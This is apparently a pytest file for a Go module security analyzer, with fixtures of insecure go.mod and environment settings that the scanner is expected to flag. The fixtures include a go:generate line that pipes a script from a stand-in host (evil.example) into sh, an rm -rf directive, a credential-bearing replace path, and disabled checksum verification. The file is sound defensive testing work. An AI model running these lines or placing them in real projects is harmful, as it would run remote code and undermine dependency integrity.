"""Tests for GoModAnalyzer."""

from pathlib import Path

from devai.go_mod_analyzer import GoModAnalyzer, GoModFinding


INSECURE_GO_MOD = """\
module example.com/demo

go 1.22

require (
    github.com/example/pkg v1.0.0
)

replace github.com/private/lib => ../local/private
replace github.com/unpinned/repo => github.com/user:secret-token@github.com/bad/repo@main

//go:generate curl -s http://evil.example/install.sh | sh
//go:generate rm -rf /tmp/build-cache
"""

INSECURE_GO_ENV = """\
GOPROXY=http://insecure-proxy.example,direct
GOSUMDB=off
GONOSUMDB=*
GOINSECURE=*
password=hardcoded-go-module-password
"""

HARDENED_GO_MOD = """\
module example.com/demo

go 1.22

require (
    github.com/example/pkg v1.0.0
)
"""


class TestGoModAnalyzer:
    def test_no_configs_returns_perfect_score(self, tmp_path: Path):
        (tmp_path / "app.py").write_text("x = 1\n", encoding="utf-8")
        analyzer = GoModAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 0
        assert analyzer.health_score() == 100.0

    def test_detects_go_mod(self, tmp_path: Path):
        (tmp_path / "go.mod").write_text(HARDENED_GO_MOD, encoding="utf-8")
        (tmp_path / "go.sum").write_text("example.com/demo v0.0.0 h1:abc=\n", encoding="utf-8")
        analyzer = GoModAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 1

    def test_detects_insecure_patterns(self, tmp_path: Path):
        (tmp_path / "go.mod").write_text(INSECURE_GO_MOD, encoding="utf-8")
        (tmp_path / "go.env").write_text(INSECURE_GO_ENV, encoding="utf-8")
        analyzer = GoModAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "replace_local" in kinds
        assert "scm_credentials" in kinds
        assert "unpinned_replace" in kinds
        assert "gosumdb_off" in kinds
        assert "gonosumdb_broad" in kinds
        assert "goinsecure_broad" in kinds
        assert "goproxy_insecure" in kinds
        assert "hardcoded_secret" in kinds
        assert "curl_pipe_shell" in kinds
        assert "dangerous_generate" in kinds
        assert "missing_sum" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_config_has_no_findings(self, tmp_path: Path):
        (tmp_path / "go.mod").write_text(HARDENED_GO_MOD, encoding="utf-8")
        (tmp_path / "go.sum").write_text("example.com/demo v0.0.0 h1:abc=\n", encoding="utf-8")
        analyzer = GoModAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert high == []

    def test_finding_format(self):
        finding = GoModFinding(
            kind="test",
            severity="high",
            message="test message",
            path="go.mod",
            lineno=1,
            line="test",
        )
        assert "go.mod:1" in finding.format()

    def test_generate_hardened_config(self):
        analyzer = GoModAnalyzer(".")
        config = analyzer.generate_hardened_config()
        assert "GOSUMDB=sum.golang.org" in config
        assert "GOPROXY=https://proxy.golang.org" in config

    def test_to_context(self, tmp_path: Path):
        (tmp_path / "go.mod").write_text(HARDENED_GO_MOD, encoding="utf-8")
        (tmp_path / "go.sum").write_text("example.com/demo v0.0.0 h1:abc=\n", encoding="utf-8")
        analyzer = GoModAnalyzer(str(tmp_path))
        context = analyzer.to_context()
        assert "Go module analysis:" in context
        assert "health score" in context
